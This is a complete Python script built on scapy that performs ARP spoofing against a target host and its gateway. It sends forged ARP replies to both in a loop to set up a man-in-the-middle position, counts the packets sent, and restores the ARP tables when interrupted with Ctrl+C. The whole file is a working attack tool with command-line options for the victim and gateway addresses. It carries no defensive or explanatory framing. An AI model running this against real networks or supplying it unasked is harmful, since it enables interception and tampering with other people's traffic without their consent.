import scapy.all as scapy
import time
from optparse import OptionParser


def taking_args():
    parser = OptionParser()
    parser.add_option('-t', '--target-ip', dest='target_ip', help='Enter Target Ip (eg: -t 192.168.1.12')
    parser.add_option('-g', '--gateway-ip', dest='gateway_ip', help='Enter gateway Ip which you want to spoof (eg: -g 192.168.1.1)')
    (options, arguments) = parser.parse_args()
    if(options.target_ip and options.gateway_ip):
        return parser.parse_args()
    else:
        print('[-] You forgot to provide valid args\nUse -h or --help for help')
        exit()

def scan(victim_ip):
    answered, unanswered = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:Ff') / scapy.ARP(pdst=victim_ip), timeout=2, verbose=False)
    return answered[0][1].hwsrc

def spoof(victim_ip, to_spoof_ip):
    victim_mac = scan(victim_ip)
    packet = scapy.ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=to_spoof_ip)
    scapy.send(packet, verbose=False)

def reset(victim_ip, to_spoof_ip):
    victim_mac = scan(victim_ip)
    to_spoof_mac = scan(to_spoof_ip)
    packet = scapy.ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=to_spoof_ip, hwsrc=to_spoof_mac)
    scapy.send(packet, verbose=False)

def spoof_loop(victim_ip, to_spoof_ip):
    i = 0
    try:
        while True:
            spoof(victim_ip, to_spoof_ip)
            spoof(to_spoof_ip, victim_ip)
            i += 2
            print('\r Total Packets Sent: '+str(i), end='')
            time.sleep(2)
    except KeyboardInterrupt:
        j=0
        while j<=5:
            some = '..' * j
            print('\r[+] ctrl + c detected Quiting the program please wait reseting the ARP table'+some, end='')
            reset(victim_ip, to_spoof_ip)
            reset(to_spoof_ip,victim_ip)
            j += 1
            time.sleep(1)

(options, arguments) = taking_args()
spoof_loop(options.target_ip, options.gateway_ip)
